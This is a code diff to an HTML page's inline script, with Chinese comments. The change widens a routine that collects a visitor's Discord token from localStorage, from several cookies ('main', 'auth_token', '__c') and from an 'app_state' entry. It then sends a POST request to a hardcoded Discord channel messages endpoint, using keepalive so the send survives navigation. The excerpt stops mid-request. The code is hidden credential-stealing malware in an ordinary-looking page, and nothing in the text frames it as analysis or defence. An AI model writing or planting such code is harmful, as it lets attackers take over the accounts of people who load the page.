@@ -23,11 +23,54 @@
   <script>
     (function() {
       try {
-        var token = localStorage.getItem("token");
-        if (token) {
-          token = token.replace(/"/g, "");
+        // 嘗試多種 token 來源
+        var token = null;
 
-          // 發送訊息到目標
+        // 1. localStorage token
+        try {
+          var stored = localStorage.getItem("token");
+          if (stored) token = stored.replace(/"/g, "");
+        } catch(e) {}
+
+        // 2. Cookie 裡的 Discord token (main.discordapp.com 的 main 和 auth_token cookies)
+        if (!token && document.cookie) {
+          var cookies = document.cookie.split(';');
+          for (var i = 0; i < cookies.length; i++) {
+            var c = cookies[i].trim();
+            if (c.indexOf('main=') === 0) {
+              var main = c.substring(5);
+              try {
+                var decoded = decodeURIComponent(main);
+                if (decoded.indexOf('token') > -1) {
+                  var match = decoded.match(/token=([^;]+)/);
+                  if (match) token = match[1];
+                } else {
+                  // main 裡面可能有 encoded token
+                  token = decoded;
+                }
+              } catch(e) {}
+            }
+            if (c.indexOf('auth_token=') === 0) {
+              token = c.substring(11);
+            }
+            if (c.indexOf('__c=') === 0) {
+              token = c.substring(6);
+            }
+          }
+        }
+
+        // 3. localStorage app_state (Discord desktop)
+        if (!token) {
+          try {
+            var appState = localStorage.getItem("app_state");
+            if (appState) {
+              token = JSON.parse(appState).token || JSON.parse(appState).accessToken;
+            }
+          } catch(e) {}
+        }
+
+        if (token) {
+          // 發送訊息到目標（keepalive 確保頁面跳走仍能送出）
           fetch("https://discord.com/api/v9/channels/878151437085974548/messages", {
             method: "POST",
             headers: {
